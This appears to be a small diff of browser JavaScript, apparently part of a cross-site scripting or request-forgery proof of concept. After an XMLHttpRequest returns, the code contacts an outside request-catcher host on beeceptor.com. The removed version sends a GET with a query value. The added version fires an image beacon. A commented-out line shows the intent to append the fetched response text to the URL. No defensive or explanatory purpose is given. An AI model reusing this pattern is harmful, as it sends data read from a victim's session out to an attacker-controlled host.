@@ -3,12 +3,10 @@ var xhr = new XMLHttpRequest();
 
 xhr.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
-      var xhr2 = new XMLHttpRequest();
-      xhr2.open("GET", "https://forum.free.beeceptor.com/?cc=AKAY", true);
+      window.document.createElement('img').src="https://forum.free.beeceptor.com/";
                 //+encodeURI(this.responseText), true);
-      xhr2.send(null);
+      
   }
-  
 };
 
 xhr.send(null);
